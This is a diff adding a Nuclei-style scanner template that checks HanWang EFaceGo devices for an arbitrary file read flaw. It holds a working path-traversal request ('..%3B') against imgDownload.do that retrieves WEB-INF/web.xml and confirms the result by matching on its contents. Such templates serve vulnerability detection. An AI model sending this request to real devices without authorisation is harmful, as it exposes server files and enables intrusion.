@@ -1,0 +1,28 @@
+id: HanWangEFaceGo-imgDownload-ReadAnyFile
+
+info:
+  name: HanWangEFaceGo-imgDownload-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    HanWangEFaceGo-imgDownload-ReadAnyFile.
+
+http:
+  - raw:
+      - |
+        GET /manage/intercom/..%3B/..%3B/manage/resourceUpload/imgDownload.do?filePath=manage/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ?xml version="1.0"
+          - <context-param
+        condition: and
+
+      - type: status
+        status:
+          - 200
